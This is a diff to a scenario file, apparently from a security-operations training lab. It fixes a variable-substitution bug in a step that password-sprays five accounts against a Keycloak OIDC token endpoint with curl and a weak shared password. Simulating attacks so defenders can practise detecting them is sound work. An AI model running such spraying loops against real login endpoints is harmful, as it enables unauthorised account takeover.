@@ -244,10 +244,12 @@ scenarios:
     default_intensity: 6
     steps:
       - cmd: |
-          for user in admin sre.alice dev.dana svc.backups operator; do
-            curl -sS -m 5 -o /dev/null -w "%{http_code} ${user}\n" \
+          # The loop variable is `u`, not `user`: the runner substitutes ${user} (the source
+          # identity) before the shell runs, so a `user` loop would guess one account five times.
+          for u in admin sre.alice dev.dana svc.backups operator; do
+            curl -sS -m 5 -o /dev/null -w "%{http_code} $u\n" \
               -d "client_id=admin-cli" -d "grant_type=password" \
-              -d "username=${user}" -d "password=Password123!" \
+              -d "username=$u" -d "password=Password123!" \
               "http://keycloak:8080/realms/soc-playground/protocol/openid-connect/token" \
               2>&1 || true
           done
